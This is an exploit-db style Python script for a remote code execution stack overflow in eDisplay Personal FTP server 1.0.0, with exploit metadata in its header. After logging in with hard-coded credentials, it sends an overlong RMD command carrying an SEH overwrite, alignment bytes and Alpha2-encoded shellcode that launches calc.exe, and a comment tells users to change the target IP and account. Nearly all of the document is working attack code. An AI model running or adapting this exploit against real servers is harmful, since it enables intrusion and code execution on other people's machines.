# Exploit Title : eDisplay Personal FTP server 1.0.0 Multiple Post-Authentication Stack BOF
# Type of sploit: Remote Code Execution
# Bug found by  : loneferret  (march 19, 2010)
# Reference     : http://www.exploit-db.com/exploits/11810
# Exploit date  : March 24, 2010
# Author        : Sud0
# Version       : 1.0.0
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Greetz to     : corelanc0d3r and of course my friends and .... first of all my wife for supporting me and my obsession :)
# Change IP and ftp account according to your server

import socket
 
junk="B" * 37 #seh overwritten after 37 bytes
nseh= "\x74\x20\x74\x20" # jmp forward (used a JE to avoid Bad Chars)
seh= "\x69\x40\x2b\x20" # ppr from 

#shellcode for calc.exe encoded with Alpha2 basereg = eax
shellcode="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJILKJLV5LKJL3XQ0WPQ0FOCXU33Q2LSSLMPEZXV0NX9WMCIRSGKO8PA" 

#shellcode to align eax for decoder
align="\x5A\x5A\x5A\x52\x58\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55"

buffer= junk+nseh+seh + "C"* 26  + align + "C" * 25 + shellcode + "A" * 50

print "Sending Exploit .... \r\n"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.101',21))
s.recv(1024)
s.send('USER fox\r\n')
s.recv(1024)
s.send('PASS mulder\r\n')
s.recv(1024)
s.send('RMD ' + buffer + '\r\n')
s.close